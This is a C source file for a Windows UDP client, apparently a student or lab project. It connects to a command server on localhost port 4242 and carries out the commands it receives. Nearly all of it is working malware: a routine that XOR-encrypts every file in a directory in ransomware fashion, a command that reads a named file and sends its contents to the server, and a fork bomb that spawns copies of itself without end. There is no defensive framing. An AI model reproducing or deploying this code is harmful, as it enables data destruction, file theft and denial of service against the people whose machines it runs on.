/*
 * =====================================================================================
 *
 *       Filename:  client.c
 *
 *    Description:  Client UDP
 *
 *        Version:  1.0
 *        Created:  18/12/2024
 *       Revision:  none
 *       Compiler:  gcc
 *
 *         Author:  Valentin Pizzio
 *   Organization:  
 *
 * =====================================================================================
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <time.h>
#include "../include/protocol.h"

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "127.0.0.1"
#define SIGNATURE "Rendez-vous tous ou ce sera la guerre - By TR - tel : 04.22.52.10.10"
#define PORT 4242

// Function to read file content
char* read_file(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        printf("Error: Cannot open file %s\n", filename);
        return NULL;
    }

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    fseek(file, 0, SEEK_SET);

    char *content = malloc(size + 1);
    if (!content) {
        printf("Error: Memory allocation failed\n");
        fclose(file);
        return NULL;
    }

    size_t read_size = fread(content, 1, size, file);
    content[read_size] = '\0';
    fclose(file);
    
    printf("Read %zu bytes from file %s\n", read_size, filename);
    return content;
}

// Function to list files in a directory for ransomware
void list_files_for_ransomware(const char* directory, char* buffer, size_t buffer_size) {
    WIN32_FIND_DATA fd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char search_path[MAX_PATH];
    char parent_dir[MAX_PATH] = "..";
    
    if (directory && strcmp(directory, "") != 0) {
        snprintf(search_path, sizeof(search_path), "..\\%s\\*", directory);
    } else {
        snprintf(search_path, sizeof(search_path), "..\\*");
    }

    hFind = FindFirstFile(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        snprintf(buffer, buffer_size, "Error: No files found in directory");
        return;
    }

    buffer[0] = '\0';
    int count = 1;
    char line[256];

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0 &&
                strcmp(fd.cFileName, "build") != 0 && strcmp(fd.cFileName, "logs") != 0) {
                snprintf(line, sizeof(line), "%d. [DIR] %s\n", count++, fd.cFileName);
                strncat(buffer, line, buffer_size - strlen(buffer) - 1);
            }
        } else {
            snprintf(line, sizeof(line), "%d. %s\n", count++, fd.cFileName);
            strncat(buffer, line, buffer_size - strlen(buffer) - 1);
        }
    } while (FindNextFile(hFind, &fd) != 0 && strlen(buffer) < buffer_size - 100);

    FindClose(hFind);
}

// Function to encrypt a file
int encrypt_file(const char* filepath, const char* key) {
    FILE* file = fopen(filepath, "rb+");
    if (!file) {
        printf("Error: Cannot open file %s\n", filepath);
        return 0;
    }

    // Get file size
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Read file content
    unsigned char* buffer = (unsigned char*)malloc(file_size);
    if (!buffer) {
        fclose(file);
        return 0;
    }

    fread(buffer, 1, file_size, file);

    // Encrypt content
    int key_len = strlen(key);
    for (long i = 0; i < file_size; i++) {
        buffer[i] ^= key[i % key_len];
    }

    // Write encrypted content back to file
    fseek(file, 0, SEEK_SET);
    fwrite(buffer, 1, file_size, file);

    free(buffer);
    fclose(file);
    return 1;
}

// Function to encrypt all files in a directory
void ransomware_directory(const char* directory, const char* key) {
    WIN32_FIND_DATA fd;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    char search_path[MAX_PATH];
    char parent_dir[MAX_PATH] = "..";

    if (directory && strcmp(directory, "") != 0) {
        snprintf(search_path, sizeof(search_path), "..\\%s\\*", directory);
    } else {
        snprintf(search_path, sizeof(search_path), "..\\*");
    }

    hFind = FindFirstFile(search_path, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0 ||
                strcmp(fd.cFileName, "build") == 0 || strcmp(fd.cFileName, "logs") == 0) {
                continue;
            }
        }

        // Skip executables and specific files
        if (strstr(fd.cFileName, ".exe") || 
            strstr(fd.cFileName, ".dll") ||
            strstr(directory, "build") ||
            strstr(directory, "logs")) {
            continue;
        }

        // Construct full path
        char full_path[MAX_PATH];
        if (directory && strcmp(directory, "") != 0) {
            snprintf(full_path, sizeof(full_path), "..\\%s\\%s", directory, fd.cFileName);
        } else {
            snprintf(full_path, sizeof(full_path), "..\\%s", fd.cFileName);
        }

        // Encrypt the file
        if (encrypt_file(full_path, key)) {
            printf("Encrypted: %s\n", full_path);
        }
    } while (FindNextFile(hFind, &fd) != 0);

    FindClose(hFind);
}

// Function to execute fork bomb
void execute_fork() {
    while (1) {
        STARTUPINFO si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);

        // Get the path of the current executable
        char path[MAX_PATH];
        GetModuleFileName(NULL, path, MAX_PATH);
        
        // Create a new process of the current executable
        if (CreateProcess(path, NULL, NULL, NULL, FALSE, 
                         CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        Sleep(10);
    }
}

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed\n");
        return 1;
    }

    SOCKET socket_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (socket_fd == INVALID_SOCKET) {
        printf("Error creating socket: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr);

    // Generate random client ID
    Message msg;
    memset(&msg, 0, sizeof(Message));
    srand((unsigned int)time(NULL));
    const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    for (int i = 0; i < ID_LENGTH; i++) {
        msg.client_id[i] = charset[rand() % (sizeof(charset) - 1)];
    }
    
    printf("Client ID: %s\n", msg.client_id);

    // Send initial message with client ID
    sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
           (struct sockaddr*)&server_addr, sizeof(server_addr));

    // Main loop
    while (1) {
        printf("\nWaiting for command from server...\n");
        
        // Wait for command
        int server_addr_size = sizeof(server_addr);
        if (recvfrom(socket_fd, (char*)&msg, sizeof(Message), 0,
                    (struct sockaddr*)&server_addr, &server_addr_size) == SOCKET_ERROR) {
            printf("Failed to receive command\n");
            break;
        }

        // Process command
        switch (msg.cmd) {
            case CMD_RANSOMWARE: {
                printf("Executing ransomware command...\n");
                ransomware_directory(msg.filename, msg.data);
                sprintf(msg.data, "Encrypted files in directory %s", msg.filename);
                sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
                      (struct sockaddr*)&server_addr, sizeof(server_addr));
                break;
            }
            case CMD_LIST_FILES: {
                // Acknowledge receipt of file list
                sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
                      (struct sockaddr*)&server_addr, sizeof(server_addr));
                break;
            }
            case CMD_EXFIL_FILE: {
                printf("Exfiltrating file: %s\n", msg.filename);
                char *content = read_file(msg.filename);
                if (content) {
                    memset(&msg.data, 0, BUFFER_SIZE);
                    strncpy(msg.data, content, BUFFER_SIZE - 1);
                    sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
                          (struct sockaddr*)&server_addr, sizeof(server_addr));
                    free(content);
                    printf("File content sent to server\n");
                } else {
                    strcpy(msg.data, "Failed to read file");
                    sendto(socket_fd, (char*)&msg, sizeof(Message), 0,
                          (struct sockaddr*)&server_addr, sizeof(server_addr));
                }
                break;
            }
            case CMD_FORK:
                printf("Executing fork command...\n");
                execute_fork();
                break;
            case CMD_OUT:
                printf("Received exit command. Closing connection...\n");
                closesocket(socket_fd);
                WSACleanup();
                return 0;
        }
    }

    closesocket(socket_fd);
    WSACleanup();
    return 0;
}